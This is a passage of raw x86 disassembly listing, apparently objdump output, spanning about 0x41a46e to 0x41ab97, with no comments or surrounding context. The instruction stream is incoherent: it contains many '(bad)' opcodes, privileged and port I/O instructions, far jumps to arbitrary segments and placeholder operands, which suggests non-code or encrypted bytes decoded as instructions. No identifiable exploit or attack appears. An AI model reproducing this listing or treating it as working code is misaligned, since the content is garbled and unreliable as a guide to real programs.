  41a46e:	mov    ebp,es
  41a470:	cmp    DWORD PTR [eax],ebx
  41a472:	sbb    al,0x3
  41a474:	iret   
  41a475:	outs   dx,BYTE PTR ds:[esi]
  41a476:	xchg   edx,eax
  41a477:	icebp  
  41a478:	iret   
  41a479:	sbb    al,0xe3
  41a47b:	mov    ch,0xb8
  41a47d:	jne    0x41a4cc
  41a47f:	pop    ss
  41a480:	push   esp
  41a481:	adc    DWORD PTR [edi*1-0x53bdbfd4],eax
  41a488:	ins    DWORD PTR es:[edi],dx
  41a489:	retf   0x5d02
  41a48c:	(bad)  
  41a48d:	fistp  WORD PTR [esi]
  41a48f:	pop    ds
  41a490:	inc    eax
  41a491:	pop    ebp
  41a492:	cwde   
  41a493:	clc    
  41a494:	ss scas al,BYTE PTR es:[edi]
  41a496:	aaa    
  41a497:	xchg   edi,eax
  41a498:	push   edx
  41a499:	rcl    BYTE PTR ds:0x6e7b096b,0x9
  41a4a0:	or     ebx,0x18
  41a4a3:	sbb    BYTE PTR [esi],ah
  41a4a5:	popf   
  41a4a6:	xchg   esi,eax
  41a4a7:	out    0xf,eax
  41a4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4aa:	adc    ah,cl
  41a4ac:	aaa    
  41a4ad:	jno    0x41a46f
  41a4af:	inc    edx
  41a4b0:	inc    ebp
  41a4b1:	out    0x93,al
  41a4b3:	scas   eax,DWORD PTR es:[edi]
  41a4b4:	ss loopne 0x41a4af
  41a4b7:	cld    
  41a4b8:	ror    BYTE PTR [ebx+0x39],1
  41a4bb:	aas    
  41a4bc:	cmp    ah,BYTE PTR [edx-0x5792417f]
  41a4c2:	scas   al,BYTE PTR es:[edi]
  41a4c3:	mov    edx,ds
  41a4c5:	xchg   esp,eax
  41a4c6:	mov    edx,0xba6c5b60
  41a4cb:	inc    edi
  41a4cc:	sti    
  41a4cd:	jmp    0x8470:0x7c0540c5
  41a4d4:	repz shl dh,1
  41a4d7:	std    
  41a4d8:	and    al,0x1b
  41a4da:	jmp    0xd499893f
  41a4df:	xor    al,0xf3
  41a4e1:	nop
  41a4e2:	dec    edx
  41a4e3:	mov    ecx,0x98cec738
  41a4e8:	push   ss
  41a4e9:	lahf   
  41a4ea:	sub    cl,BYTE PTR [ecx+ecx*4+0x201f0130]
  41a4f1:	sbb    DWORD PTR [esi-0x7206e98e],ebp
  41a4f7:	xchg   ebp,eax
  41a4f8:	mov    al,0x1b
  41a4fa:	mov    dl,0x6
  41a4fc:	aas    
  41a4fd:	out    dx,eax
  41a4fe:	sbb    esp,DWORD PTR [ebx+0x4204289f]
  41a504:	dec    eax
  41a505:	jb     0x41a4ac
  41a507:	cmp    al,0xb4
  41a509:	loopne 0x41a4f8
  41a50b:	pushf  
  41a50c:	xchg   BYTE PTR [eax+0x56],bh
  41a50f:	sub    DWORD PTR [ebx],esi
  41a511:	pop    ecx
  41a512:	hlt    
  41a513:	cmp    ebx,DWORD PTR [esi-0x57612470]
  41a519:	dec    ebp
  41a51a:	push   ecx
  41a51b:	dec    esp
  41a51c:	out    0xbc,eax
  41a51e:	sbb    al,0x5c
  41a520:	shl    cl,1
  41a522:	mov    ecx,0xac5f850c
  41a527:	in     al,0xe0
  41a529:	fldenv [ebx-0xd]
  41a52c:	pop    ecx
  41a52d:	cmp    ah,dh
  41a52f:	mov    ecx,0xde2c556f
  41a534:	shl    BYTE PTR [edi+0x56e9cad6],1
  41a53a:	jae    0x41a4fe
  41a53c:	lods   eax,DWORD PTR ds:[esi]
  41a53d:	cmp    esi,DWORD PTR [edi+edx*2+0x39]
  41a541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a542:	addr16 inc esi
  41a544:	xor    eax,DWORD PTR [ebp-0x73]
  41a547:	call   0x44e64e12
  41a54c:	(bad)  
  41a54d:	pop    eax
  41a54e:	adc    al,0x51
  41a550:	outs   dx,DWORD PTR ds:[esi]
  41a551:	mov    ebp,0x6a40767b
  41a556:	ret    0xc486
  41a559:	out    dx,eax
  41a55a:	fimul  DWORD PTR [ebx+0x27d336aa]
  41a560:	int3   
  41a561:	mov    DWORD PTR [edi],edx
  41a563:	push   ds
  41a564:	loopne 0x41a510
  41a566:	sbb    eax,0x5f04fa30
  41a56b:	ror    DWORD PTR [esi],1
  41a56d:	fsub   st,st(4)
  41a56f:	ror    edi,0xe8
  41a572:	mov    bh,0x7d
  41a574:	mov    ecx,0x55dcc54a
  41a579:	hlt    
  41a57a:	sahf   
  41a57b:	push   cs
  41a57c:	push   ds
  41a57d:	in     al,dx
  41a57e:	pop    esi
  41a57f:	stc    
  41a580:	call   0x6f6e:0x6518bd62
  41a587:	mov    bl,0x4d
  41a589:	loope  0x41a5ba
  41a58b:	or     BYTE PTR [eax+0x4c],0x3f
  41a58f:	pop    ebx
  41a590:	imul   edi,DWORD PTR [edx-0x33f22d6e],0xb412f254
  41a59a:	jo     0x41a59f
  41a59c:	outs   dx,DWORD PTR ds:[esi]
  41a59d:	xor    eax,0xfa5664f0
  41a5a2:	scas   al,BYTE PTR es:[edi]
  41a5a3:	adc    dl,BYTE PTR [edx*2-0x59280ae5]
  41a5aa:	cmp    ebp,DWORD PTR ds:0x400b022d
  41a5b0:	fisubr WORD PTR [edi+edi*2]
  41a5b3:	mov    dh,bl
  41a5b5:	shr    DWORD PTR ds:0xed9ec230,0x63
  41a5bc:	dec    edi
  41a5bd:	add    eax,DWORD PTR [esi+0x422ed9d7]
  41a5c3:	outs   dx,BYTE PTR ds:[esi]
  41a5c4:	sbb    eax,0x92564865
  41a5c9:	and    al,0xba
  41a5cb:	mov    ecx,0x7a59fca9
  41a5d0:	push   eax
  41a5d1:	int3   
  41a5d2:	ret    0x76e8
  41a5d5:	cmovo  esi,ebx
  41a5d8:	in     eax,dx
  41a5d9:	inc    edi
  41a5da:	sub    bl,bh
  41a5dc:	xchg   BYTE PTR [esi-0x79],bl
  41a5df:	mov    ecx,0xf166a62
  41a5e4:	rol    BYTE PTR [edx+0x640fdf54],cl
  41a5ea:	popf   
  41a5eb:	retf   0xf975
  41a5ee:	ss push esi
  41a5f0:	mov    esp,0x7db67ea9
  41a5f5:	in     eax,dx
  41a5f6:	test   eax,0x14ba0720
  41a5fb:	sub    ebx,esi
  41a5fd:	shl    bh,1
  41a5ff:	and    BYTE PTR [edi-0x11],ch
  41a602:	icebp  
  41a603:	fiadd  WORD PTR [ecx+0xb2a50c8]
  41a609:	mov    ds:0x68219902,al
  41a60e:	adc    eax,DWORD PTR [eax-0x80]
  41a611:	aad    0xf6
  41a613:	pop    esi
  41a614:	mov    eax,ds:0x558c8c6f
  41a619:	mov    dl,0x9d
  41a61b:	setae  BYTE PTR [ecx-0x2f]
  41a61f:	dec    edx
  41a620:	push   eax
  41a621:	dec    esi
  41a622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a623:	or     DWORD PTR [edx+0x20],ecx
  41a626:	and    eax,ebx
  41a628:	push   ecx
  41a629:	fst    QWORD PTR [ebx]
  41a62b:	pop    esp
  41a62c:	push   ebx
  41a62d:	xor    ebx,DWORD PTR [eax+edx*1-0x18e357f2]
  41a634:	sub    eax,0x73c58d36
  41a639:	je     0x41a61a
  41a63b:	mov    edi,0xd2f6034a
  41a640:	cmp    ebx,0x65
  41a643:	sub    DWORD PTR [edx],esi
  41a645:	jnp    0x41a657
  41a647:	inc    esi
  41a648:	cmc    
  41a649:	adc    eax,DWORD PTR [ebx-0x35]
  41a64c:	inc    esi
  41a64d:	cmp    eax,0x754a850a
  41a652:	cwde   
  41a653:	cli    
  41a654:	fnsetpm(287 only) 
  41a656:	out    dx,al
  41a657:	xchg   edx,eax
  41a658:	ror    cl,0x67
  41a65b:	add    al,0x10
  41a65d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a65e:	popa   
  41a65f:	mov    gs,WORD PTR [edi]
  41a661:	cdq    
  41a662:	outs   dx,DWORD PTR ds:[esi]
  41a663:	mov    ds:0x4b6b5610,al
  41a668:	mov    esp,0x253d8a9a
  41a66d:	int3   
  41a66e:	mov    eax,0xe4cef3a6
  41a673:	xchg   ebx,eax
  41a674:	xlat   BYTE PTR ds:[ebx]
  41a675:	adc    esi,eax
  41a677:	mov    bh,0x37
  41a679:	lods   al,BYTE PTR ds:[esi]
  41a67a:	es jae 0x41a6a5
  41a67d:	cmp    DWORD PTR [ecx+0x201c57e3],edx
  41a683:	scas   eax,DWORD PTR es:[edi]
  41a684:	dec    edi
  41a685:	cmp    esp,DWORD PTR [edx-0x585716e0]
  41a68b:	add    bh,dh
  41a68d:	in     eax,0xb4
  41a68f:	adc    al,0x51
  41a691:	stc    
  41a692:	retf   0xdbfa
  41a695:	fild   QWORD PTR [esi]
  41a697:	push   edi
  41a698:	pop    ds
  41a699:	je     0x41a6e2
  41a69b:	cmp    al,0xd3
  41a69d:	push   ebp
  41a69e:	cmp    al,0xc7
  41a6a0:	das    
  41a6a1:	dec    edx
  41a6a2:	jno    0x41a6bb
  41a6a4:	js     0x41a69e
  41a6a6:	jno    0x41a6ab
  41a6a8:	ss dec ebx
  41a6aa:	fstp   DWORD PTR [eax]
  41a6ac:	cmp    ah,BYTE PTR [esp+eiz*4]
  41a6af:	pop    edi
  41a6b0:	shl    DWORD PTR [edx],cl
  41a6b2:	jl     0x41a6fc
  41a6b4:	aaa    
  41a6b5:	ins    DWORD PTR es:[edi],dx
  41a6b6:	sub    eax,0x55022489
  41a6bb:	or     BYTE PTR [ebx+0x5ce6d2c2],al
  41a6c1:	sub    eax,DWORD PTR [edx]
  41a6c3:	mov    ebp,0x10c7a1b0
  41a6c8:	leave  
  41a6c9:	sti    
  41a6ca:	icebp  
  41a6cb:	(bad)  
  41a6cd:	jle    0x41a6cb
  41a6cf:	bound  esp,QWORD PTR [edx-0x1f]
  41a6d2:	and    BYTE PTR [esi+0x72],dh
  41a6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d6:	sbb    BYTE PTR [esi],bh
  41a6d8:	mov    al,0x7e
  41a6da:	aaa    
  41a6db:	popa   
  41a6dc:	test   ah,cl
  41a6de:	into   
  41a6df:	and    BYTE PTR [ebx],al
  41a6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6e2:	icebp  
  41a6e3:	loopne 0x41a6a1
  41a6e5:	push   ss
  41a6e6:	or     eax,0x81ca84e4
  41a6eb:	xor    bl,BYTE PTR [ebp-0x71179c1e]
  41a6f1:	push   ecx
  41a6f2:	(bad)  
  41a6f3:	out    0xf1,eax
  41a6f5:	adc    edi,eax
  41a6f7:	scas   eax,DWORD PTR es:[edi]
  41a6f8:	(bad)  
  41a6f9:	cwde   
  41a6fa:	sbb    DWORD PTR [ebx-0x41],esi
  41a6fd:	push   ss
  41a6fe:	xor    dl,dl
  41a700:	cs stos DWORD PTR es:[edi],eax
  41a702:	cmp    BYTE PTR [eax],ch
  41a704:	icebp  
  41a705:	jae    0x41a6b1
  41a707:	sahf   
  41a708:	pop    esi
  41a709:	mov    ch,0x8b
  41a70b:	inc    ebx
  41a70c:	imul   esi,ecx,0xffffffde
  41a70f:	jp     0x41a735
  41a711:	ss jecxz 0x41a6c1
  41a714:	jmp    0xe99c08c6
  41a719:	je     0x41a748
  41a71b:	pop    esi
  41a71c:	pop    esi
  41a71d:	in     al,0x42
  41a71f:	jl     0x41a76c
  41a721:	mov    dl,0x7f
  41a723:	dec    eax
  41a724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a725:	pop    edi
  41a726:	imul   edx,DWORD PTR [esi-0x80],0xd7cdcf3c
  41a72d:	in     al,0x5f
  41a72f:	or     eax,0xd1ed3b54
  41a734:	lds    edi,FWORD PTR [ebp+0x1eb23436]
  41a73a:	fmul   QWORD PTR [edx]
  41a73c:	fwait
  41a73d:	sbb    edi,esi
  41a73f:	pop    eax
  41a740:	aam    0x76
  41a742:	dec    esp
  41a743:	lods   eax,DWORD PTR ds:[esi]
  41a744:	gs call 0xdf005da1
  41a74a:	cmp    DWORD PTR [esp+esi*1],esi
  41a74d:	xchg   ebp,eax
  41a74e:	push   ds
  41a74f:	xor    cl,BYTE PTR [edi]
  41a751:	aam    0xf2
  41a753:	in     al,0x84
  41a755:	sub    eax,0xa5086765
  41a75a:	shl    BYTE PTR ds:[ecx],1
  41a75d:	jns    0x41a7ae
  41a75f:	pop    ecx
  41a760:	mov    fs,esp
  41a762:	xor    al,0x95
  41a764:	push   ss
  41a765:	jbe    0x41a766
  41a767:	mov    dl,0x44
  41a769:	dec    edi
  41a76a:	pop    ebx
  41a76b:	(bad)  
  41a76c:	jmp    0xe817:0xfa6d91db
  41a773:	(bad)
  41a777:	(bad)  
  41a779:	shl    DWORD PTR [eax+0xb],0xdb
  41a77d:	std    
  41a77e:	imul   esp,DWORD PTR [ebp+0x39],0x92fc4c34
  41a785:	xchg   DWORD PTR [esi+0x39],ebp
  41a788:	sub    ebp,0xda756644
  41a78e:	retf   0xee9d
  41a791:	rol    BYTE PTR [ebx+0x442ae385],cl
  41a797:	in     eax,dx
  41a798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a799:	xchg   edx,eax
  41a79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79b:	dec    edi
  41a79c:	push   edi
  41a79d:	bound  edi,QWORD PTR [ebx-0x6c]
  41a7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a1:	xchg   edx,eax
  41a7a2:	arpl   WORD PTR [eax-0x21],dx
  41a7a5:	aad    0x4d
  41a7a7:	mov    dl,ch
  41a7a9:	sub    ah,BYTE PTR [ebx]
  41a7ab:	aaa    
  41a7ac:	xchg   ecx,eax
  41a7ad:	or     al,BYTE PTR [edx-0x7da3d7b8]
  41a7b3:	or     ah,bh
  41a7b5:	mov    ah,BYTE PTR [edi+eiz*8]
  41a7b8:	inc    BYTE PTR [eax+ebp*2]
  41a7bb:	jg     0x41a79d
  41a7bd:	dec    ebp
  41a7be:	stos   DWORD PTR es:[edi],eax
  41a7bf:	mov    bl,0xa2
  41a7c1:	out    0x5a,al
  41a7c3:	js     0x41a77e
  41a7c5:	outs   dx,DWORD PTR ds:[esi]
  41a7c6:	mov    bh,0x8c
  41a7c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7c9:	out    0x1a,eax
  41a7cb:	xchg   edi,eax
  41a7cc:	ret    
  41a7cd:	ret    
  41a7ce:	cmp    BYTE PTR ds:0x88eb91e7,dh
  41a7d4:	xor    al,dh
  41a7d6:	mov    cs,WORD PTR [ebp-0x65ccd69]
  41a7dc:	dec    ebp
  41a7dd:	ins    DWORD PTR es:[edi],dx
  41a7de:	cmp    DWORD PTR [ebp+0x28c82ab7],0xffffffd6
  41a7e5:	fmulp  st(4),st
  41a7e7:	rcr    BYTE PTR [edi+0x3bef32f],cl
  41a7ed:	pop    ds
  41a7ee:	ins    DWORD PTR es:[edi],dx
  41a7ef:	inc    ecx
  41a7f0:	mov    ecx,0x527a7879
  41a7f5:	bnd call 0x9cc87c3f
  41a7fb:	dec    ebx
  41a7fc:	fstp   DWORD PTR [eax]
  41a7fe:	mov    ds:0x42ae2c46,eax
  41a803:	ficomp WORD PTR [eax+0x50]
  41a806:	mov    cl,0x58
  41a808:	push   esi
  41a809:	mov    WORD PTR [edx],ss
  41a80b:	(bad)  
  41a80c:	fnstcw WORD PTR [edx]
  41a80e:	cld    
  41a80f:	pop    ss
  41a810:	rol    DWORD PTR [edi],1
  41a812:	cmp    BYTE PTR [edi],al
  41a814:	leave  
  41a815:	pop    edi
  41a816:	or     eax,0x8cb4fd48
  41a81b:	sub    edx,esi
  41a81d:	in     al,0xfc
  41a81f:	cmc    
  41a820:	jmp    0x9b29:0xe2f91049
  41a827:	push   ebp
  41a828:	sub    ebp,DWORD PTR [edi]
  41a82a:	xor    al,0x65
  41a82c:	mov    al,0x4a
  41a82e:	mov    ch,0xf8
  41a830:	mov    ch,0x59
  41a832:	dec    edx
  41a833:	popf   
  41a834:	sbb    ch,dh
  41a836:	push   bx
  41a838:	or     DWORD PTR [eax+0x65],esi
  41a83b:	inc    edi
  41a83c:	inc    edx
  41a83d:	rcr    BYTE PTR [ebx-0x32f523e3],cl
  41a843:	ret    
  41a844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a845:	js     0x41a882
  41a847:	les    edx,FWORD PTR [ebp+0x441411af]
  41a84d:	shl    DWORD PTR [ebp+0x1],cl
  41a850:	aaa    
  41a851:	lds    edx,FWORD PTR [ebp+ecx*4-0x23]
  41a855:	test   esi,eax
  41a857:	jno    0x41a88c
  41a859:	cmp    edx,ebp
  41a85b:	fdivr  QWORD PTR [eax-0x27]
  41a85e:	and    dl,0x7a
  41a861:	mov    eax,ebx
  41a863:	into   
  41a864:	jae    0x41a887
  41a866:	add    DWORD PTR ds:0x6b7c5e74,esi
  41a86c:	xchg   ecx,eax
  41a86d:	int3   
  41a86e:	mov    ebp,0x5e24f059
  41a873:	or     DWORD PTR [ecx+0x4a5f0a27],esi
  41a879:	sar    DWORD PTR [eax],1
  41a87b:	mov    cl,0x2
  41a87d:	test   DWORD PTR [ebx-0x31c63674],ecx
  41a883:	xchg   BYTE PTR [ebx+0x32],ah
  41a886:	jae    0x41a820
  41a888:	in     eax,dx
  41a889:	or     eax,0x5e08606d
  41a88e:	test   DWORD PTR [ebx],0x9a6016c0
  41a894:	inc    esp
  41a895:	adc    al,0x26
  41a897:	mov    dh,0x3a
  41a899:	neg    DWORD PTR [ebx]
  41a89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a89c:	dec    esp
  41a89d:	xor    eax,0xd0357dd3
  41a8a2:	jle    0x41a858
  41a8a4:	clc    
  41a8a5:	ret    
  41a8a6:	mov    bl,0x20
  41a8a8:	clc    
  41a8a9:	scas   eax,DWORD PTR es:[edi]
  41a8aa:	push   0x29
  41a8ac:	fsubr  QWORD PTR [ebp+0x6a]
  41a8af:	aas    
  41a8b0:	pop    edx
  41a8b1:	arpl   dx,di
  41a8b3:	ret    
  41a8b4:	test   eax,0xd8ead704
  41a8b9:	and    DWORD PTR [edx+0x7e],ecx
  41a8bc:	jnp    0x41a892
  41a8be:	dec    ebx
  41a8bf:	mov    eax,ds:0x2094ae4d
  41a8c4:	imul   edi,DWORD PTR [ebp+0x7c7dd043],0xb5f66430
  41a8ce:	xchg   esi,eax
  41a8cf:	jge    0x41a878
  41a8d1:	icebp  
  41a8d2:	shr    DWORD PTR [edi+eiz*8-0x6c],0x1a
  41a8d7:	jg     0x41a895
  41a8d9:	or     esi,eax
  41a8db:	push   ecx
  41a8dc:	mov    ds:0x4d9dbc3f,eax
  41a8e1:	xchg   esp,eax
  41a8e2:	pop    eax
  41a8e3:	jnp    0x41a938
  41a8e5:	retf   
  41a8e6:	ja     0x41a8eb
  41a8e8:	cmp    BYTE PTR [ecx-0x41],bh
  41a8eb:	or     esp,esi
  41a8ed:	xchg   ecx,eax
  41a8ee:	dec    esp
  41a8ef:	gs lahf 
  41a8f1:	in     al,dx
  41a8f2:	mov    ?,WORD PTR [ebp-0xa8ad230]
  41a8f8:	outs   dx,BYTE PTR ds:[esi]
  41a8f9:	fucomip st,st(1)
  41a8fb:	and    eax,0x52628665
  41a900:	arpl   WORD PTR [edi-0x11],si
  41a903:	sub    esi,DWORD PTR [esi+0xa]
  41a906:	daa    
  41a907:	lahf   
  41a908:	jne    0x41a8c7
  41a90a:	mov    al,0x85
  41a90c:	mov    ebp,0x80edd6c7
  41a911:	clc    
  41a912:	outs   dx,DWORD PTR ds:[esi]
  41a913:	ror    DWORD PTR [ebp+0x7078d01c],0xe8
  41a91a:	sbb    esp,ebx
  41a91c:	cdq    
  41a91d:	es loope 0x41a91d
  41a920:	in     eax,dx
  41a921:	mov    DWORD PTR [eax-0x7c],ecx
  41a924:	push   ebp
  41a925:	hlt    
  41a926:	lods   al,BYTE PTR ds:[esi]
  41a927:	jle    0x41a8e1
  41a929:	bound  esp,QWORD PTR [eax]
  41a92b:	ins    DWORD PTR es:[edi],dx
  41a92c:	std    
  41a92d:	retf   0xd6f
  41a930:	aam    0xa7
  41a932:	and    ch,BYTE PTR [edi]
  41a934:	ins    DWORD PTR es:[edi],dx
  41a935:	(bad)  
  41a936:	loopne 0x41a98a
  41a938:	mov    ebx,0x777ca24c
  41a93d:	mov    al,0xc5
  41a93f:	call   0x715f:0x7853c14a
  41a946:	xchg   ebp,eax
  41a947:	and    edi,eax
  41a949:	adc    al,0x40
  41a94b:	add    DWORD PTR [eax+eiz*1+0x65cedc5e],ecx
  41a952:	popf   
  41a953:	jns    0x41a95b
  41a955:	rol    BYTE PTR [ebp+0x1c],cl
  41a958:	pop    edi
  41a959:	repnz and DWORD PTR [esi-0x5068c23d],ebx
  41a960:	das    
  41a961:	es dec eax
  41a963:	or     bl,BYTE PTR [bx+di-0x3502]
  41a968:	repnz int3 
  41a96a:	imul   edi,ecx,0xa101af6
  41a970:	cmc    
  41a971:	xchg   edx,eax
  41a972:	aad    0x10
  41a974:	inc    edx
  41a975:	scas   eax,DWORD PTR es:[edi]
  41a976:	push   eax
  41a977:	jns    0x41a968
  41a979:	and    eax,0xa9f773b8
  41a97e:	xor    DWORD PTR [ebp+0x1bde015c],edx
  41a984:	pushf  
  41a985:	jmp    0x42042936
  41a98a:	pop    edi
  41a98b:	clc    
  41a98c:	daa    
  41a98d:	test   al,0xda
  41a98f:	pop    ebp
  41a990:	sub    eax,0xdf929278
  41a995:	popa   
  41a996:	ret    0x79d5
  41a999:	js     0x41a9e5
  41a99b:	fst    DWORD PTR [esi]
  41a99d:	test   ecx,edi
  41a99f:	inc    esp
  41a9a0:	mov    esi,DWORD PTR [ebp-0x64]
  41a9a3:	push   cs
  41a9a4:	aaa    
  41a9a5:	or     BYTE PTR [esi+eax*1+0x57],cl
  41a9a9:	sub    al,ah
  41a9ab:	idiv   BYTE PTR [eax-0x1a]
  41a9ae:	popa   
  41a9af:	and    DWORD PTR [esi-0x5fb789e7],ecx
  41a9b5:	shr    BYTE PTR [esi+ecx*4-0x1c],1
  41a9b9:	lods   eax,DWORD PTR ds:[esi]
  41a9ba:	sahf   
  41a9bb:	inc    ebp
  41a9bc:	je     0x41a94b
  41a9be:	mov    ecx,0x17bc6bc8
  41a9c3:	jl     0x41a9fd
  41a9c5:	sbb    eax,0xafee04cc
  41a9ca:	rcr    BYTE PTR [esi-0x7d],1
  41a9cd:	jae    0x41a986
  41a9cf:	ror    edi,1
  41a9d1:	out    dx,al
  41a9d2:	loope  0x41a9d4
  41a9d4:	cmp    BYTE PTR [eax],ch
  41a9d6:	inc    edx
  41a9d7:	push   esi
  41a9d8:	and    DWORD PTR [ecx],0x21a17fb9
  41a9de:	enter  0x1a65,0xb4
  41a9e2:	into   
  41a9e3:	add    eax,0xda00beaf
  41a9e8:	sub    BYTE PTR [edi],ch
  41a9ea:	jecxz  0x41aa2e
  41a9ec:	sbb    eax,0xba5ba6d3
  41a9f1:	xchg   ebp,eax
  41a9f2:	int    0x98
  41a9f4:	pop    ecx
  41a9f5:	cs out dx,eax
  41a9f7:	mov    eax,ds:0xc5508549
  41a9fc:	xchg   esi,eax
  41a9fd:	fdivr  DWORD PTR [ecx]
  41a9ff:	scas   eax,DWORD PTR es:[edi]
  41aa00:	lods   al,BYTE PTR ds:[esi]
  41aa01:	and    BYTE PTR [ebx+0x1b20f853],cl
  41aa07:	adc    eax,0xe5474cbe
  41aa0c:	or     eax,0x77f172af
  41aa11:	aad    0x96
  41aa13:	out    dx,eax
  41aa14:	dec    ebp
  41aa15:	mov    ds:0xfa4f709e,al
  41aa1a:	xchg   esi,eax
  41aa1b:	push   es
  41aa1c:	mov    ?,esi
  41aa1e:	push   ss
  41aa1f:	pop    ebp
  41aa20:	xchg   edi,eax
  41aa21:	xchg   ebx,eax
  41aa22:	jge    0x41aa65
  41aa24:	out    0x73,eax
  41aa26:	(bad)  
  41aa27:	jmp    0x41aa80
  41aa29:	aam    0x32
  41aa2b:	cld    
  41aa2c:	add    BYTE PTR [ebx-0x2d],0x6c
  41aa30:	xor    eax,0x55535c9
  41aa35:	pop    sp
  41aa37:	xchg   edx,eax
  41aa38:	inc    eax
  41aa39:	int3   
  41aa3a:	int3   
  41aa3b:	sbb    dh,BYTE PTR [ebx-0x4f88e4b0]
  41aa41:	call   0xbcf3:0x47e33fbc
  41aa48:	sub    ah,BYTE PTR [eax-0x5f137c10]
  41aa4e:	push   eax
  41aa4f:	pop    ss
  41aa50:	sbb    al,BYTE PTR [ecx-0xd]
  41aa53:	es lods eax,DWORD PTR ss:[esi]
  41aa56:	mov    ebp,0xa6ffee7f
  41aa5b:	imul   esi,DWORD PTR [esi],0x2f
  41aa5e:	jne    0x41a9e8
  41aa60:	mov    gs,edx
  41aa62:	out    dx,eax
  41aa63:	lea    ecx,[eax]
  41aa65:	in     eax,0xc4
  41aa67:	sbb    ecx,DWORD PTR [edx-0x299d66fa]
  41aa6d:	mov    edx,0xbd603a46
  41aa72:	int    0xa4
  41aa74:	jmp    0x41aab7
  41aa76:	xor    edx,DWORD PTR [ebx]
  41aa78:	sbb    DWORD PTR [edx],esp
  41aa7a:	inc    eax
  41aa7b:	popf   
  41aa7c:	or     BYTE PTR [esp+esi*8+0x7b],dh
  41aa80:	les    ebx,FWORD PTR [ebp+edi*4+0x2a92889e]
  41aa87:	stos   BYTE PTR es:[edi],al
  41aa88:	out    0x14,ax
  41aa8b:	int    0x77
  41aa8d:	mov    al,BYTE PTR [ecx-0x4c]
  41aa90:	pop    edi
  41aa91:	call   0x2087:0xac3255e5
  41aa98:	fs jno 0x41aaf7
  41aa9b:	mov    bl,0xd
  41aa9d:	or     eax,0xc4fb0551
  41aaa2:	dec    esp
  41aaa3:	fcom   QWORD PTR [edi+0x40c72472]
  41aaa9:	ds pusha 
  41aaab:	mov    cl,0x74
  41aaad:	ret    
  41aaae:	and    BYTE PTR [edx],dh
  41aab0:	jecxz  0x41aad2
  41aab2:	in     eax,dx
  41aab3:	iret   
  41aab4:	loopne 0x41aac2
  41aab6:	and    DWORD PTR [eax+0x36f3f002],esi
  41aabc:	in     eax,dx
  41aabd:	jl     0x41aaed
  41aabf:	shr    BYTE PTR [ecx],1
  41aac1:	push   ebx
  41aac2:	push   0x7963404c
  41aac7:	hlt    
  41aac8:	or     al,0xac
  41aaca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aacb:	call   0x1342:0xdd8bb148
  41aad2:	hlt    
  41aad3:	aaa    
  41aad4:	jecxz  0x41aaba
  41aad6:	sar    BYTE PTR [ebx],1
  41aad8:	fst    st(3)
  41aada:	retf   
  41aadb:	sbb    edx,esi
  41aadd:	cmp    DWORD PTR [esi-0x4535647e],eax
  41aae3:	fwait
  41aae4:	cmp    eax,0xd079206
  41aae9:	cdq    
  41aaea:	inc    ebp
  41aaeb:	dec    ecx
  41aaec:	mov    dl,0x61
  41aaee:	mov    al,0x94
  41aaf0:	jno    0x41ab00
  41aaf2:	push   ss
  41aaf3:	pop    edx
  41aaf4:	out    dx,eax
  41aaf5:	xor    ah,0x6f
  41aaf8:	jne    0x41aae1
  41aafa:	fild   WORD PTR [ecx+0x59a7a478]
  41ab00:	mul    BYTE PTR [esi+edx*1+0x13]
  41ab04:	sub    DWORD PTR [esi+0x4c],eax
  41ab07:	sub    eax,0xa6203523
  41ab0c:	jle    0x41aaa8
  41ab0e:	(bad)  
  41ab0f:	xor    BYTE PTR [edi],bh
  41ab11:	test   al,0xa6
  41ab13:	add    DWORD PTR [esi-0x2f],edi
  41ab16:	or     BYTE PTR [esi-0x52],al
  41ab19:	push   esp
  41ab1a:	or     eax,0xaa284b5c
  41ab1f:	rol    ebx,cl
  41ab21:	ja     0x41aad5
  41ab23:	sub    DWORD PTR [ecx],edi
  41ab25:	jbe    0x41aac7
  41ab27:	mov    edi,0xdedc4cb
  41ab2c:	stos   DWORD PTR es:[edi],eax
  41ab2d:	xchg   ecx,eax
  41ab2e:	mov    dl,0xea
  41ab30:	sbb    ebp,DWORD PTR [edx]
  41ab32:	mov    edx,0xbb169c8
  41ab37:	cmp    BYTE PTR [ebp+0x4df694bb],al
  41ab3d:	sbb    eax,0xe0499312
  41ab42:	inc    ebp
  41ab43:	or     al,0xdb
  41ab45:	sti    
  41ab46:	xor    dh,bh
  41ab48:	mov    ch,0x19
  41ab4a:	ins    BYTE PTR es:[edi],dx
  41ab4b:	jae    0x41ab42
  41ab4d:	out    dx,al
  41ab4e:	scas   eax,DWORD PTR es:[edi]
  41ab4f:	adc    DWORD PTR [edi+0x4e785979],eax
  41ab55:	(bad)  
  41ab57:	fcomip st,st(6)
  41ab59:	inc    edx
  41ab5a:	loopne 0x41abc7
  41ab5c:	xchg   esi,eax
  41ab5d:	gs sti 
  41ab5f:	and    eax,0x4dfd7dbc
  41ab64:	push   ebp
  41ab65:	data16 mov bl,0x27
  41ab68:	jno    0x41ab17
  41ab6a:	test   DWORD PTR [ecx+eax*8],ebp
  41ab6d:	mov    ss,esi
  41ab6f:	test   dl,bl
  41ab71:	jno    0x41ab3a
  41ab73:	mov    dl,0xc0
  41ab75:	xor    eax,0x1d6360b4
  41ab7a:	cmp    eax,0xb263871e
  41ab7f:	pop    ebx
  41ab80:	push   ecx
  41ab81:	or     eax,0x249deb4c
  41ab86:	les    esp,FWORD PTR [ebx]
  41ab88:	mov    DWORD PTR [eax],eax
  41ab8a:	cmp    BYTE PTR [esi-0xb],bh
  41ab8d:	adc    eax,0xb360792a
  41ab92:	iret   
  41ab93:	dec    esp
  41ab94:	fdivp  st(1),st
  41ab96:	dec    ecx
  41ab97:	sub    esi,ebp
